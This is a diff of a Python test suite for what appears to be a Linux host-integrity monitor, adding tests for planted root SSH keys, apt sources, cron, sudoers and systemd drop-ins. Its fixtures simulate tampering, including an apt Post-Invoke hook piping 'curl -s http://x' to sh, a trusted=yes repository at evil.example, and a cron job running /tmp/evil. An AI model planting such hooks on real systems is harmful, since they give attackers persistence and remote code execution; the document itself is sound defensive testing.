@@ -2433,8 +2433,11 @@ class SuidDiffTests(unittest.TestCase):
 
     def setUp(self):
         _isolate()
-        from arx.modules import baseline, guard, recon
+        from arx.modules import baseline, guard, integrity, recon
         self.b, self.g, self.rc = baseline, guard, recon
+        p = mock.patch.object(integrity, "groups", lambda: {})  # solo SUID: nada de ficheros del host
+        p.start()
+        self.addCleanup(p.stop)
 
     def _drift(self, base, current):
         with mock.patch.object(self.rc, "collect_users", lambda: {"suid_binaries": current}), \
@@ -3302,13 +3305,17 @@ class AcceptFlowTests(unittest.TestCase):
     def test_a_legitimate_change_to_a_critical_file_can_be_accepted(self):
         """Tras un `useradd`, la única salida era revertir /etc/passwd."""
         crit = os.path.join(self.d, "passwd")
-        open(crit, "w").write("uno\n")
+        open(crit, "w").write("uno:x:1000:1000::/home/uno:/bin/bash\n")
+        from arx.modules import integrity
         with mock.patch.object(self.b, "integrity_paths", lambda: {"passwd": [crit]}), \
+             mock.patch.object(integrity, "groups", lambda: {"passwd": [crit]}), \
              mock.patch.object(self.b, "suid_fingerprint", lambda: None):
-            self.b.save({**self.b.new_baseline(), "integrity": self.b.integrity_fingerprint()})
-            open(crit, "w").write("dos\n")
+            self.b.save({**self.b.new_baseline(), "integrity": self.b.integrity_fingerprint(),
+                         "integrity_files": integrity.snapshot()[0]})
+            open(crit, "w").write("uno:x:1000:1000::/home/uno:/bin/bash\ndos:x:1001:1001::/home/dos:/bin/bash\n")
             drift = self.g._integrity_drift(self.b.load(), False)
             self.assertEqual(len(drift), 1)
+            self.assertEqual(drift[0]["target"]["path"], crit)
             o = self.r.handle(drift[0], enforce=True, cfg={})
             self.assertEqual(len(self.r.list_pending()), 1)
             with mock.patch("sys.stdout"):
@@ -3318,24 +3325,29 @@ class AcceptFlowTests(unittest.TestCase):
         # la copia buena ya es la nueva: restaurar no debe devolver el fichero viejo
         manifest = self.r.config.read_json(self.r._vault_manifest_path(), {})
         import hashlib
-        self.assertEqual(manifest[crit]["sha256"], hashlib.sha256(b"dos\n").hexdigest())
+        self.assertEqual(manifest[crit]["sha256"], hashlib.sha256(open(crit, "rb").read()).hexdigest())
 
     def test_a_second_different_change_to_the_same_file_alerts_again(self):
         """B51: la huella sin contenido condenaba al silencio la 2.ª modificación del mismo fichero:
         ni incidente, ni pendiente, ni Telegram (prueba real F2, llave trampa 2 vueltas)."""
+        import base64
+        key = lambda n: "ssh-ed25519 " + base64.b64encode(bytes([n]) * 51).decode() + "\n"  # noqa: E731
         crit = os.path.join(self.d, "authorized_keys")
-        open(crit, "w").write("clave-sellada\n")
+        open(crit, "w").write(key(1))
+        from arx.modules import integrity
         with mock.patch.object(self.b, "integrity_paths", lambda: {"authorized_keys_root": [crit]}), \
+             mock.patch.object(integrity, "groups", lambda: {"authorized_keys_root": [crit]}), \
              mock.patch.object(self.b, "suid_fingerprint", lambda: None):
-            self.b.save({**self.b.new_baseline(), "integrity": self.b.integrity_fingerprint()})
-            open(crit, "w").write("clave-atacante-1\n")
+            self.b.save({**self.b.new_baseline(), "integrity": self.b.integrity_fingerprint(),
+                         "integrity_files": integrity.snapshot()[0]})
+            open(crit, "w").write(key(1) + key(2))
             d1 = self.g._integrity_drift(self.b.load(), False)
             self.assertEqual(len(d1), 1)
             o1 = self.r.handle(d1[0], enforce=True, cfg={})
             self.assertTrue(o1["new"])
             self.assertEqual(len(self.r.list_pending()), 1)
             # segunda vuelta, contenido DISTINTO, fichero aún sin resolver: tiene que sonar otra vez
-            open(crit, "w").write("clave-atacante-2\n")
+            open(crit, "w").write(key(1) + key(3))
             d2 = self.g._integrity_drift(self.b.load(), False)
             self.assertEqual(len(d2), 1)
             self.assertNotEqual(self.r.fingerprint(d1[0]), self.r.fingerprint(d2[0]))
@@ -8314,31 +8326,6 @@ class ConfinementTests(unittest.TestCase):
         self.assertEqual(self.calls, [])
 
 
-class AptTrustWatchTests(unittest.TestCase):
-    def test_an_older_baseline_adopts_the_new_watch_without_raising_an_alarm(self):
-        """Una base sellada antes de vigilar apt no puede convertir el estado actual en un hallazgo."""
-        _isolate()
-        from arx.modules import baseline, guard, response
-        now = {"passwd": "a", "apt_sources": "b", "apt_keys": "c"}
-        adopted = []
-        with mock.patch.object(baseline, "integrity_fingerprint", lambda include_suid=True: now), \
-                mock.patch.object(baseline, "accept", lambda k, i: adopted.append(i) or True):
-            found = guard._integrity_drift({"integrity": {"passwd": "a"}}, include_suid=False)
-        self.assertEqual(found, [])
-        self.assertEqual(sorted(adopted), ["apt_keys", "apt_sources"])
-        kinds = [json.loads(line)["kind"] for line in open(response._incidents_path())]
-        self.assertEqual(kinds.count("integrity_watch_added"), 2)
-
-    def test_a_new_repository_is_critical(self):
-        _isolate()
-        from arx.modules import baseline, guard
-        with mock.patch.object(baseline, "integrity_fingerprint",
-                               lambda include_suid=True: {"apt_sources": "nuevo"}):
-            found = guard._integrity_drift({"integrity": {"apt_sources": "viejo"}}, include_suid=False)
-        self.assertEqual([(f["sev"], f["target"]["file"]) for f in found], [("crit", "apt_sources")])
-
-
-
 class BehaviorWatchTests(unittest.TestCase):
     """F18.1: lo que un servicio hace normalmente, aprendido en el kernel; lo demás se corta."""
 
@@ -9268,40 +9255,6 @@ def config_read(path):
     return config.read_json(path, {}) or {}
 
 
-class IntegrityGroupTests(unittest.TestCase):
-    """Antes solo se comparaba lo sellado: un authorized_keys de root creado DESPUÉS no avisaba nunca."""
-
-    def setUp(self):
-        _isolate()
-        from arx import i18n
-        from arx.modules import baseline, guard
-        self.b, self.g = baseline, guard
-        i18n.set_lang("en")
-        self.addCleanup(i18n.set_lang, "es")
-
-    def _drift(self, sealed, now, late=True):
-        with mock.patch.object(self.b, "integrity_fingerprint", lambda include_suid=True: now), \
-                mock.patch.object(self.b, "accept", lambda k, i: True), \
-                mock.patch.object(self.b, "mark_late_watches", lambda: None):
-            return self.g._integrity_drift({"integrity": sealed, "meta": {"late_watches": late}}, False)
-
-    def test_a_group_planted_after_sealing_is_critical(self):
-        found = self._drift({"passwd": "a"}, {"passwd": "a", "authorized_keys_root": "x"})
-        self.assertEqual([(f["sev"], f["target"]["file"]) for f in found], [("crit", "authorized_keys_root")])
-        self.assertIn("appeared", found[0]["detail"])
-
-    def test_a_group_that_disappears_is_reported(self):
-        found = self._drift({"passwd": "a", "cron": "c"}, {"passwd": "a"})
-        self.assertIn("disappeared", found[0]["detail"])
-
-    def test_only_the_new_apt_watches_are_adopted_and_only_once(self):
-        self.assertEqual(self._drift({"passwd": "a"}, {"passwd": "a", "apt_keys": "k"}, late=False), [])
-        found = self._drift({"passwd": "a"}, {"passwd": "a", "apt_keys": "k"}, late=True)
-        self.assertEqual([f["target"]["file"] for f in found], ["apt_keys"])  # ya no: un repositorio nuevo
-        found = self._drift({"passwd": "a"}, {"passwd": "a", "authorized_keys_root": "x"}, late=False)
-        self.assertEqual([f["target"]["file"] for f in found], ["authorized_keys_root"])  # nunca se adopta
-
-
 class ProfileSetMigrationTests(unittest.TestCase):
     """B54: nft 1.0.9 muestra «cgroupv2 level 0» en el typeof de sets creados con «level 2» (medido en Ubuntu
     24.04; también los de versiones anteriores, creados igual). La jerarquía la compara la regla, y un proceso
@@ -10111,11 +10064,11 @@ class ConfigSemanticsTests(unittest.TestCase):
                                                 "Components: main\nAllow-Insecure: yes\n", deb822=True))
         self.assertEqual(ch.sev, "crit")
 
-    def test_a_new_repository_is_high_and_says_whether_it_is_pinned_to_a_key(self):
+    def test_a_new_repository_is_critical_and_says_whether_it_is_pinned_to_a_key(self):
         signed = self._cl("apt_sources", "", "deb [signed-by=/usr/share/keyrings/d.gpg] https://download.docker.com/linux/ubuntu noble stable\n")
-        self.assertEqual(signed.sev, "high")
+        self.assertEqual(signed.sev, "crit")  # una fuente de confianza nueva para la prueba de procedencia
         unsigned = self._cl("apt_sources", "", "deb https://ppa.example/ubuntu noble main\n")
-        self.assertEqual(unsigned.sev, "high")
+        self.assertEqual(unsigned.sev, "crit")
         self.assertNotEqual(signed.summary.split(":")[0], unsigned.summary.split(":")[0])  # dice que no va atado a una clave
 
     def test_component_change_is_medium_and_removal_low(self):
@@ -10239,6 +10192,191 @@ class ConfigSemanticsTests(unittest.TestCase):
                     self.c.classify(group, p, None)
         self.assertFalse(self.c.apt_conf("{" * 5000).ok)
         self.assertTrue(self.c.analyze("apt_keys", b"\x99\x01binary").ok)
+
+
+class IntegrityFileTests(unittest.TestCase):
+    """B77/B73: la integridad crítica fichero a fichero, por significado, con diff y sin falsos positivos propios."""
+
+    KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl\n"
+
+    def setUp(self):
+        self.d = _isolate()
+        from arx import i18n
+        from arx.modules import baseline, guard, integrity, response
+        self.b, self.g, self.i, self.r = baseline, guard, integrity, response
+        i18n.set_lang("en")
+        self.addCleanup(i18n.set_lang, "es")
+        self.layout = {}
+        for target, name, value in ((integrity, "groups", lambda: self.layout),
+                                    (integrity, "_SYSTEMD_DIRS", (os.path.join(self.d, "systemd"),)),
+                                    (baseline, "adopt_integrity_files", lambda *a, **k: None),
+                                    (baseline, "mark_integrity_pending", lambda g: None)):
+            p = mock.patch.object(target, name, value)
+            p.start()
+            self.addCleanup(p.stop)
+
+    def _file(self, group, name, text, mode=0o644):
+        path = os.path.join(self.d, name)
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        with open(path, "w") as f:
+            f.write(text)
+        os.chmod(path, mode)
+        self.layout.setdefault(group, []).append(path) if path not in self.layout.get(group, []) else None
+        return path
+
+    def _seal(self):
+        files = self.i.snapshot()[0]
+        self.r.backup_critical({g: [p for p in ps if os.path.isfile(p)] for g, ps in self.layout.items()})
+        return {"integrity": {"x": "y"}, "integrity_files": files, "meta": {}}
+
+    def _drift(self, base):
+        return self.g._integrity_drift(base, False)
+
+    def test_planted_root_key_is_critical_and_names_the_file_and_key(self):
+        path = os.path.join(self.d, "root_keys")
+        self.layout["authorized_keys_root"] = [path]
+        base = self._seal()
+        self._file("authorized_keys_root", "root_keys", self.KEY)
+        found = self._drift(base)
+        self.assertEqual([(f["sev"], f["target"]["path"]) for f in found], [("crit", path)])
+        self.assertIn("SHA256:", found[0]["detail"])
+
+    def test_an_empty_sources_list_appearing_is_quiet(self):
+        """El crit del piloto en Debian 13 (apt-daily-upgrade dejó un sources.list vacío)."""
+        self._file("apt_sources", "apt/debian.sources",
+                   "Types: deb\nURIs: https://deb.debian.org/debian\nSuites: trixie\nComponents: main\n"
+                   "Signed-By: /usr/share/keyrings/debian-archive-keyring.gpg\n")
+        self.layout["apt_sources"].append(os.path.join(self.d, "apt/sources.list"))
+        base = self._seal()
+        self._file("apt_sources", "apt/sources.list", "")
+        self.assertEqual(self._drift(base), [])
+
+    def test_a_trusted_repository_or_a_hook_is_critical_with_a_diff(self):
+        src = self._file("apt_sources", "apt/x.list", "deb [signed-by=/k.gpg] https://ex.org/r stable main\n")
+        conf = self._file("apt_conf", "apt/apt.conf.d/20auto", 'APT::Periodic::Update-Package-Lists "1";\n')
+        base = self._seal()
+        self._file("apt_sources", "apt/x.list", "deb [trusted=yes] http://evil.example/ ./\n")
+        self._file("apt_conf", "apt/apt.conf.d/20auto",
+                   'APT::Periodic::Update-Package-Lists "1";\nDPkg::Post-Invoke {"curl -s http://x|sh";};\n')
+        found = {f["target"]["path"]: f for f in self._drift(base)}
+        self.assertEqual({p: f["sev"] for p, f in found.items()}, {src: "crit", conf: "crit"})
+        self.assertIn("+deb [trusted=yes]", found[src]["diff"])
+        self.assertIn("-deb [signed-by=/k.gpg]", found[src]["diff"])
+
+    def test_formatting_only_changes_are_quiet(self):
+        self._file("cron", "cron.d/backup", "0 3 * * * root /usr/local/bin/backup\n")
+        base = self._seal()
+        self._file("cron", "cron.d/backup", "# nightly\n0  3 * * *   root /usr/local/bin/backup\n\n")
+        self.assertEqual(self._drift(base), [])
+
+    def test_loosened_permissions_on_a_sudoers_file_are_high(self):
+        path = self._file("sudoers_d", "sudoers.d/ops", "ops ALL=(ALL) /usr/bin/apt\n", mode=0o440)
+        base = self._seal()
+        os.chmod(path, 0o666)
+        found = self._drift(base)
+        self.assertEqual([(f["sev"], f["target"]["path"]) for f in found], [("high", path)])
+
+    def test_a_fifo_planted_where_configuration_goes_does_not_hang_and_is_reported(self):
+        self._file("cron", "cron.d/real", "0 3 * * * root /bin/true\n")
+        base = self._seal()
+        fifo = os.path.join(self.d, "cron.d/trap")
+        os.mkfifo(fifo)
+        self.layout["cron"].append(fifo)
+        found = self._drift(base)  # si leyera el FIFO, esta prueba no terminaría
+        self.assertEqual([(f["sev"], f["target"]["path"]) for f in found], [("high", fifo)])
+
+    def test_a_drop_in_that_runs_something_and_a_wants_link_are_high(self):
+        sd = os.path.join(self.d, "systemd")
+        os.makedirs(f"{sd}/ssh.service.d", exist_ok=True)
+        os.makedirs(f"{sd}/multi-user.target.wants", exist_ok=True)
+        base = self._seal()
+        self._file("systemd", "systemd/ssh.service.d/override.conf", "[Service]\nExecStartPre=/tmp/x\n")
+        link = f"{sd}/multi-user.target.wants/evil.service"
+        os.symlink("/etc/systemd/system/evil.service", link)
+        self.layout["systemd"].append(link)
+        found = {f["target"]["path"]: f["sev"] for f in self._drift(base)}
+        self.assertEqual(found, {f"{sd}/ssh.service.d/override.conf": "high", link: "high"})
+
+    def test_arx_own_drop_in_is_adopted_but_an_altered_one_is_tampering(self):
+        text = "[Service]\nExecStartPre=-/usr/sbin/nft -f /var/lib/arx/files/web.service.nft\n"
+        base = self._seal()
+        path = self._file("systemd", "systemd/web.service.d/90-arx-profile.conf", text)
+        self.i.register_own(path, text)
+        self.assertEqual(self._drift(base), [])
+        self._file("systemd", "systemd/web.service.d/90-arx-profile.conf", text + "ExecStartPre=/tmp/x\n")
+        found = self._drift(base)
+        self.assertEqual([(f["kind"], f["sev"]) for f in found], [("self_tamper", "crit")])
+
+    def test_arx_units_are_left_to_its_own_self_check(self):
+        unit = self._file("systemd", "systemd/arx.service", "[Service]\nExecStart=/usr/bin/arx guard\n")
+        self.r.config.write_json(self.r.config.state_dir() / "self.json", {unit: "otra"})
+        self.assertEqual(self._drift({"integrity": {"x": "y"}, "integrity_files": {}, "meta": {}}), [])
+
+    def test_unreadable_configuration_is_never_ignored(self):
+        self._file("apt_conf", "apt/apt.conf.d/50x", 'APT::Get::Assume-Yes "true";\n')
+        base = self._seal()
+        self._file("apt_conf", "apt/apt.conf.d/50x", 'APT { Get { Assume-Yes "true";\n')
+        self.assertEqual([f["sev"] for f in self._drift(base)], ["high"])
+
+    def test_too_many_files_is_itself_a_finding(self):
+        for n in range(5):
+            self._file("cron", f"cron.d/f{n}", "")
+        with mock.patch.object(self.i, "MAX_FILES_PER_GROUP", 3):
+            found = self._drift(self._seal())
+        self.assertIn("overflow", found[0]["fp_key"])
+
+    def test_restoring_a_finding_restores_only_that_file(self):
+        a = self._file("cron", "cron.d/a", "0 1 * * * root /bin/a\n")
+        b = self._file("cron", "cron.d/b", "0 2 * * * root /bin/b\n")
+        self._seal()
+        self._file("cron", "cron.d/a", "* * * * * root /tmp/evil\n")
+        self._file("cron", "cron.d/b", "0 2 * * * root /bin/b2\n")
+        with mock.patch.object(self.r, "quarantine_file", lambda p, source=None: "q"):
+            self.r._restore_from_vault("cron", only=a)
+        self.assertEqual(open(a).read(), "0 1 * * * root /bin/a\n")
+        self.assertEqual(open(b).read(), "0 2 * * * root /bin/b2\n")  # lo demás no se toca
+
+    # ── migración desde la huella por grupo (R4) ──
+    def _legacy_base(self):
+        with mock.patch.object(self.i, "legacy_groups", lambda: self.layout), \
+             mock.patch.object(self.b, "integrity_paths", lambda: self.layout):
+            sealed = self.b.legacy_fingerprint()
+        self.r.backup_critical({g: [p for p in ps if os.path.isfile(p)] for g, ps in self.layout.items()})
+        return {"integrity": sealed, "meta": {}}
+
+    def _drift_legacy(self, base, layout=None):
+        with mock.patch.object(self.i, "legacy_groups", lambda: layout or self.layout), \
+             mock.patch.object(self.b, "integrity_paths", lambda: layout or self.layout):
+            return self._drift(base)
+
+    def test_an_unchanged_old_baseline_migrates_in_silence(self):
+        self._file("passwd", "passwd", "root:x:0:0::/root:/bin/bash\n")
+        base = self._legacy_base()
+        self.assertEqual(self._drift_legacy(base), [])
+        self.assertIn(os.path.join(self.d, "passwd"), base["integrity_files"])
+
+    def test_an_old_group_that_changed_is_judged_by_meaning_when_the_vault_matches(self):
+        self._file("apt_sources", "apt/debian.sources",
+                   "Types: deb\nURIs: https://deb.debian.org/debian\nSuites: trixie\nComponents: main\n"
+                   "Signed-By: /k.gpg\n")
+        base = self._legacy_base()
+        self._file("apt_sources", "apt/sources.list", "")  # el grupo antiguo cambió…
+        self.assertEqual(self._drift_legacy(base), [])     # …pero no significa nada
+
+    def test_an_old_group_without_a_faithful_vault_keeps_its_group_alert(self):
+        self._file("cron", "crontab", "0 1 * * * root /bin/a\n")
+        base = self._legacy_base()
+        self.r.config.write_json(self.r._vault_manifest_path(), {})  # sin copia buena
+        self._file("cron", "crontab", "* * * * * root /tmp/x\n")
+        found = self._drift_legacy(base)
+        self.assertEqual([(f["sev"], f["target"]["file"]) for f in found], [("high", "cron")])
+
+    def test_files_never_watched_before_are_adopted_and_said_once(self):
+        self._file("passwd", "passwd", "root:x:0:0::/root:/bin/bash\n")
+        base = self._legacy_base()
+        self._file("systemd", "systemd/foo.service.d/x.conf", "[Service]\nNice=5\n")
+        found = self._drift_legacy(base, layout={"passwd": self.layout["passwd"]})
+        self.assertEqual([f["kind"] for f in found], ["integrity_watch_added"])
 
 
 if __name__ == "__main__":
